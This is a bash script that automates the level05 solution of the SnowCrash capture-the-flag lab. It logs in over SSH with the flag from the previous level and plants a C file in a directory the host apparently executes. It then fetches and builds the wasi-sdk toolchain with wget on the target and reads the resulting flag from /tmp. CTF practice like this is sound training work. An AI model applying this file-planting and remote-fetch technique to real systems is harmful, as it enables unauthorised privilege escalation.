#! /bin/bash

if ! command -v sshpass
then
    echo -e "Install sshpass command before executing this shell script."
else
    USER="level05"
    ADDRESS="localhost"
    PORT="4242"
    export SSHPASS=$(cat ../../level04/flag)
    echo -e "\nExploiting level05 ssh server ...\n\n\n"
    C_SRC="metaverse.c"
    C_DST="/opt/snowcrash/level05/metaverse.c"

    cat "$C_SRC" | sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "cat > '$C_DST'"
    echo -e "copy a file to $C_DST"

    WASI_VERSION="24"
    WASI_VERSION_FULL="${WASI_VERSION}.0"
    WASI_ARCH="x86_64" # or 'arm64'
    WASI_OS="linux"

    TARBALL="wasi-sdk-${WASI_VERSION_FULL}-${WASI_ARCH}-${WASI_OS}.tar.gz"
    URL="https://github.com/WebAssembly/wasi-sdk/releases/download/wasi-sdk-${WASI_VERSION}/${TARBALL}"
    DIR_NAME="wasi-sdk-${WASI_VERSION_FULL}-${WASI_ARCH}-${WASI_OS}"

    COMMAND="cd /opt/snowcrash/level05 && \
wget -q '${URL}' && \
tar -xzf '${TARBALL}' && \
./${DIR_NAME}/bin/clang metaverse.c -o metaverse.wasm"

    echo -e "Running remote command:\n$COMMAND\n"
    sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "$COMMAND"

    sleep 31

    echo -e "\nGot a flag:"
    DEST="/tmp/flag05"
    sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "cat $DEST"
fi
